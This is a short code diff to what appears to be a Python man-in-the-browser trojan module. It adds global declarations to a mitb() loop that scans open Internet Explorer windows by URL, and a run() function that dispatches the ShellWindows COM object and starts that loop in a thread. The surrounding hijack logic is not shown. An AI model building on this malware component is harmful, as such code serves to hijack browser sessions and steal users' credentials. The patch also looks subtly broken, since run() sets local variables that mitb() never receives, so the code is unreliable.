@@ -42,6 +42,8 @@ def wait_for_browser(browser):
 
 
 def mitb():
+  global windows
+  global clsid
   while True:
    for browser in windows:
       url = urlparse.urlparse(browser.LocationUrl)
@@ -96,6 +98,9 @@ def mitb():
       time.sleep(0) 
 
 def run(**args):		  
+   clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
+
+   windows = win32com.client.Dispatch(clsid)
 			 
    thread_mitb = threading.Thread(target=mitb)
    thread_mitb.start()
